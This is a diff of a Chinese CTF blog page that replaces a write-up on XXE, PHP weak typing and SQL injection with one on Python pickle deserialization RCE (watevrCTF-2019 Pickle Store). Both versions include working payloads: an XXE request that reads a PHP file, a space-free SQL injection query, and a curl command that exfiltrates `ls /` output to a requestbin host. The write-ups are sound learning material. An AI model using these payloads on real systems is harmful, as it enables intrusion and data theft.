@@ -4,10 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="三叶草招新赛部分wp, Z3ratu1&#39;s blog">
-    <meta name="description" content="三叶草招新赛部分wp最近是三叶草招新，不愧是强队，招新赛都这么难，学习了QWQ
-性感黄阿姨在线聊天打开是一个对话框，输入表情包可以获得三叶草师傅们的表情包（没有什么实际意义）题目分两层，一层PHP弱类型一层XXE（xml实体注入）
-弱类型比">
+    <meta name="keywords" content="watevrCTF-2019 Pickle Store, Z3ratu1&#39;s blog">
+    <meta name="description" content="watevrCTF-2019 Pickle Store之前做了他们的一个cookie store的题目，cookie伪造一下就能过，是个水题，就顺着做了他们的pickle store，做起来就不太对劲了，难度upup
+同样在cookie处能">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +14,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>三叶草招新赛部分wp | Z3ratu1&#39;s blog</title>
+    <title>watevrCTF-2019 Pickle Store | Z3ratu1&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -287,13 +286,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/img/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/ctf.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        三叶草招新赛部分wp
+                        watevrCTF-2019 Pickle Store
                     </div>
                 </div>
             </div>
@@ -404,8 +403,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/xxe/" target="_blank">
-                                <span class="chip bg-color">xxe</span>
+                            <a href="/tags/wp/" target="_blank">
+                                <span class="chip bg-color">wp</span>
+                            </a>
+                        
+                            <a href="/tags/python/" target="_blank">
+                                <span class="chip bg-color">python</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank">
+                                <span class="chip bg-color">反序列化</span>
                             </a>
                         
                     </div>
@@ -428,21 +435,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2019-12-10
+                    2020-02-28
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        1.6k
+                        688
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        6 Min
+                        2 Min
                     </div>
                     
                 
@@ -458,83 +465,14 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="三叶草招新赛部分wp"><a href="#三叶草招新赛部分wp" class="headerlink" title="三叶草招新赛部分wp"></a>三叶草招新赛部分wp</h1><p>最近是三叶草招新，不愧是强队，招新赛都这么难，学习了QWQ</p>
-<h2 id="性感黄阿姨在线聊天"><a href="#性感黄阿姨在线聊天" class="headerlink" title="性感黄阿姨在线聊天"></a>性感黄阿姨在线聊天</h2><p>打开是一个对话框，输入表情包可以获得三叶草师傅们的表情包（没有什么实际意义）<br>题目分两层，一层PHP弱类型一层XXE（xml实体注入）</p>
-<h3 id="弱类型比较字符串"><a href="#弱类型比较字符串" class="headerlink" title="弱类型比较字符串"></a>弱类型比较字符串</h3><p>首先抓包发现数据以json的格式传递，<code>{&quot;root&quot;:{&quot;name&quot;:&quot;guest&quot;,&quot;request&quot;:&quot;flag&quot;}}</code><br>按照要求将guest改为admin之后出现一个判断<br><code>admin也不行! //if($name==md5($flag)){flag in ...}</code><br>这里只有name可控，在等号两边都可控时可以输入两个数组，通过md5函数无法处理数组返回null的性质绕过对md5的检验，这里显然不行，但这里数据是以json格式传递，我们可以控制数据类型（GET，POST方法默认传递过去的值为字符串），使用弱类型比较的转换</p>
-<h4 id="PHP字符与数字比较"><a href="#PHP字符与数字比较" class="headerlink" title="PHP字符与数字比较"></a>PHP字符与数字比较</h4><p>若字符串与数字比较，则认为0与其相等，若字符串以数字开头，则将其转化为开头的连续数字进行比较</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span>
-    <span class="token keyword">echo</span> <span class="token string">'pass'</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">132</span> <span class="token operator">==</span> <span class="token string">'132flag'</span><span class="token punctuation">)</span>
-    <span class="token keyword">echo</span> <span class="token string">'pass'</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
-<p>输出结果均为pass<br>用0实验不成，猜测可能flag的md5开头为数字，用burp的intruder模块爆破，得到name=357时通过验证，回显flag在<code>./_f14g_Is_Here_.php</code>，位于当前目录下，但是我们没有读的办法</p>
-<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>现在还不会XML注入，据说payload不用记，临时要用的时候网上搜一把就有了<br>在上传xml的时候要把Content-Type改为application/xml<br>大概原理应该是xml被包含之后可执行吧？<br>张师傅的样例报文</p>
-<pre><code>POST /message.php HTTP/1.1
-Host: 148.70.59.198:41257
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
-Accept: */*
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Content-Type: application/xml
-Content-Length: 188
-Origin: http://148.70.59.198:41257
-Connection: close
-Referer: http://148.70.59.198:41257/
-
-&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=_f14g_Is_Here_.php&quot; &gt;]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;request&gt;flag&lt;/request&gt;
-&lt;/root&gt;</code></pre><p>xml的格式于json保持一致，定义了一个xml实体并在name处引用<br>不是很懂XML是情况，为什么还能适用PHP伪协议的<br>在xml实体注入读取flag的时候，由于flag藏在php文件中，文件中的&lt;?php中的尖括号会让xml解析错误，无法直接读取，故可以使用filter伪协议以编码方式读出</p>
-<p>最后拿到了三叶草的wp，师傅的说法是既然发现他能够解析json格式，就可以猜测其能够解析xml文档，又此处如果判断不过在<code>name</code>处存在对输入名称的回显，将此处替换为xml实体，就可以尝试读取文件了</p>
-<p>参考XXE资料: <a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/177979.html</a></p>
-<h2 id="又来一只猫"><a href="#又来一只猫" class="headerlink" title="又来一只猫"></a>又来一只猫</h2><p>很简单的一个反序列化。。。简单的不能再简单，但是还是卡了我十分钟，就是因为那个很坑的私有成员变量<br>比如一个名为Stu的类有一个name的私有成员(private)，那么他在反序列化之后的名字会变为<code>\00Stu\00name</code>，但是本地跑出来的时候那个\00只是一个空格，打过去就不能正常反序列化覆盖默认值，把空格改为\00即可解决，protected的变量反序列化之后应为<code>\00*\00name</code></p>
-<h2 id="反引号调用shell-exce函数"><a href="#反引号调用shell-exce函数" class="headerlink" title="反引号调用shell_exce函数"></a>反引号调用shell_exce函数</h2><p>学到的一个新的知识点，PHP中被反引号会调用shell_exce函数达到命令执行的效果，在disable_function中如果禁用了shell_exce函数则反引号同时失效</p>
-<h2 id="代码审计一"><a href="#代码审计一" class="headerlink" title="代码审计一"></a>代码审计一</h2><p>贴一下重要部分源码，删去无关部分，能看懂就行</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-    <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">"If I knew where I would die, I would never go there."</span><span class="token punctuation">;</span>
-    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//"))</span>
-    <span class="token punctuation">{</span>
-        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Not allow !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>curl配置项
-        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$output</span> <span class="token operator">===</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-        <span class="token punctuation">{</span>
-            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">==</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
-            <span class="token punctuation">{</span>
-                <span class="token keyword">echo</span> <span class="token string">"Congratulations. Flag is  SYC{********************************}"</span><span class="token punctuation">;</span>
-            <span class="token punctuation">}</span>
-
-<span class="token delimiter">?></span></code></pre>
-<p>难度也不大，不过感觉有点意思，显然是将url导入到自己的服务器上，可以自己进行控制，从而满足要求，应该也算是ctf中的一个常用套路，不过我第一次见罢了（菜），做了就顺手记录一下</p>
-<h2 id="乱七八糟的思路"><a href="#乱七八糟的思路" class="headerlink" title="乱七八糟的思路"></a>乱七八糟的思路</h2><p>首先想着是不是能控制自己服务器的回复请求，这样子一个个改包回复就可以完成（太菜了不会实现）<br>然后就是waf师傅说的，把一个文件当数据库，每次访问就pop出第一位出来，这样子完成整个遍历<br>比较菜，写的脚本异常丑陋</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-</code></pre>
-<p>又踩了一个坑，在服务器上的一个文件权限是需要修改的，不然PHP不能修改文件，用chmod临时改一下，应该有长久之计吧，但是还是菜</p>
-<h2 id="SQL注入系列"><a href="#SQL注入系列" class="headerlink" title="SQL注入系列"></a>SQL注入系列</h2><p>都不难，从万能密码到查数据库到替换为空到过滤，算是一次复习，就是最后那个过滤空格的地方让我重新调了一会payload，现在这个无需空格和逗号的payload放一下<br><code>select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database())from(1))));</code><br>当然这里只有一个列，如果有多列要那种1,1,group_concat()的情况的话，考虑一下用join函数继续调整payload</p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>大队不愧是大队，后来在上海线下的时候面对面的遇上了三叶草的师傅，其中有一个就是大二的师傅，可以说水平以及远超我一大截了，招新赛虽然很简单的题也多，但是像我记录的这些题还有几个难题实在是做不出来，强校的基础还是比我们好啊，起步晚了，还需努力。</p>
+                <h1 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="watevrCTF-2019 Pickle Store"></a>watevrCTF-2019 Pickle Store</h1><p>之前做了他们的一个cookie store的题目，cookie伪造一下就能过，是个水题，就顺着做了他们的pickle store，做起来就不太对劲了，难度upup</p>
+<p>同样在cookie处能取得一串base64，解码之后用pickle.loads加载，可以看到一个数组，记载了钱数和货物，但是这回多了一个hmac的签名，加密用的密钥是没办法搞出来了，那就只能另寻他路</p>
+<h2 id="pickle反序列化漏洞"><a href="#pickle反序列化漏洞" class="headerlink" title="pickle反序列化漏洞"></a>pickle反序列化漏洞</h2><p>python的反序列化漏洞危害比PHP要大，因为能做到任意代码执行，直接写一个类，创建一个__reduce__方法，该方法在该类被序列化时使用，返回字符串或元组。<br>我们可以在返回值处调用我们想要使用的函数，不过这种方法只能调用一个函数，例如<code>return (os.system,(&#39;ls&#39;,))</code>，并且这里是一定要加逗号的，圆括号中添加逗号会将其声明为元组，而规定__reduce__方法的返回值必须是<strong>字符串或元组</strong>，使用不这么用就会报错</p>
+<p>不过不必担心没有导入os模块，我们可以在__reduce__方法中使用import进行导入，__reduce__方法作为序列化的魔法方法，返回值可以被我们控制为函数，其被反序列化时可被执行，但这样子可以执行的函数只有返回值的那一个，想要执行多个代码，我们需要手搓pickle(但是没懂为什么可以在__reduce__中import模块来导入本来没有的模块)</p>
+<h3 id="坑点1"><a href="#坑点1" class="headerlink" title="坑点1"></a>坑点1</h3><p>不同平台下的反序列化结果是不一样的，甚至python的版本也会影响pickle的结果，使用这个题在Windows下生成的payload就不奏效，最后又回到Linux上做payload</p>
+<h3 id="坑点2"><a href="#坑点2" class="headerlink" title="坑点2"></a>坑点2</h3><p>这里无论执行什么都不会有回显，但是通过执行time.sleep发现有明显的延迟，证实可以命令执行，使用url进行外带或者反弹shell，反弹shell弹了几下没成功，curl外带可以去buu的这个平台<a href="http://http.requestbin.buuoj.cn/" target="_blank" rel="noopener">http://http.requestbin.buuoj.cn/</a><br>执行的命令是 <code>curl http://http.requestbin.buuoj.cn/17ozn5q1/\?a=\</code>ls / | base64 | sed -n “1p”``<br>一开始还没看懂，其实就是像这个平台发一个请求，用GET提交一个a，内容为反引号命令执行的内容</p>
+<h3 id="手搓pickle的任意命令执行"><a href="#手搓pickle的任意命令执行" class="headerlink" title="手搓pickle的任意命令执行"></a>手搓pickle的任意命令执行</h3><p>使用一个名为marshal的库可以实现(不过如果这个库被ban了也就没戏了)<br>参考链接 <a href="https://www.freebuf.com/articles/system/89165.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/89165.html</a></p>
+<p>比如p神说的这种情况，这时需要真正的手搓pickle，理解其基本意义，实现命令执行<br><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">p神的题和解法</a></p>
 
             </div>
             <hr/>
@@ -693,9 +631,9 @@ Referer: http://148.70.59.198:41257/
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《三叶草招新赛部分wp》
+                    《watevrCTF-2019 Pickle Store》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/12/10/%E4%B8%89%E5%8F%B6%E8%8D%89%E6%8B%9B%E6%96%B0%E8%B5%9B/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/02/28/watevrCTF-2019%20Pickle%20Store/" property="cc:attributionName"
                rel="cc:attributionURL">
                 Z3ratu1
             </a> is licensed under a
@@ -739,35 +677,32 @@ Referer: http://148.70.59.198:41257/
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2020/02/12/SUCTF2019%20ezphp/">
+                <a href="/2020/03/01/PHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
                         
-                        <img src="/img/ctf1.jpg" class="responsive-img" alt="SUCTF2019 ezweb">
+                        <img src="/img/php.jpg" class="responsive-img" alt="PHP文件操作漏洞">
                         
-                        <span class="card-title">SUCTF2019 ezweb</span>
+                        <span class="card-title">PHP文件操作漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SUCTF2019 ezwebBUU平台上复现题目，主要学习了一下异或绕过的操作还踩了一些奇奇怪怪的坑，题目共三层，层层绕过搞了我好几天，还是太菜了
-第一层第一层源码
-$hhh = @$_GET['_'];
-
-if (!$hhh){
-   
+                            PHP文件操作漏洞今天师傅们在群里聊到一个问题，有关于PHP文件操作对目录和文件判定相关的一个点，看了师傅们找到的一篇文章，感觉很有意思
+PHP底层实现存在的一些问题，导致PHP写入、读取时对畸形文件名存在一些错误处理，导致漏洞产生
+例一f
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-12
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-01
                         </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
-                                    刷题记录
+                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category" target="_blank">
+                                    笔记
                                 </a>
                             
                             
@@ -781,8 +716,8 @@ if (!$hhh){
                         <span class="chip bg-color">php</span>
                     </a>
                     
-                    <a href="/tags/wp/" target="_blank">
-                        <span class="chip bg-color">wp</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E/" target="_blank">
+                        <span class="chip bg-color">漏洞</span>
                     </a>
                     
                 </div>
@@ -796,27 +731,24 @@ if (!$hhh){
                 Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/11/10/decade%20wp/">
+                <a href="/2020/02/27/%E5%98%B6%E5%90%BCCTF%20Online%20Proxy/">
                     <div class="card-image">
                         
-                        <img src="/img/ctf.jpg" class="responsive-img" alt="decade wp">
+                        <img src="/img/ctf1.jpg" class="responsive-img" alt="嘶吼CTF Online Proxy">
                         
-                        <span class="card-title">decade wp</span>
+                        <span class="card-title">嘶吼CTF Online Proxy</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            decade wp复现复现，是一道bytectf修改了的题，加了几个过滤
-无参数函数的命令执行&lt;?php
-highlight_file(__FILE__);
-$code = $_GET['code'];
-if (!empty($cod
+                            嘶吼CTF Online Proxy嘶吼的一个题，好像上次打了嘶吼，然后一个题磨了一天没摸出来
+一开始以为是ssrf，试了半天发现写死了必须要http:// 开头，感觉就没机会了，查看源码，发现一个注释显示显示了当前IP，修改XFF头发现可
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-10
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-27
                             </span>
                         <span class="publish-author">
                             
@@ -833,8 +765,12 @@ if (!empty($cod
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/php/" target="_blank">
-                        <span class="chip bg-color">php</span>
+                    <a href="/tags/wp/" target="_blank">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                    <a href="/tags/SQLI/" target="_blank">
+                        <span class="chip bg-color">SQLI</span>
                     </a>
                     
                 </div>
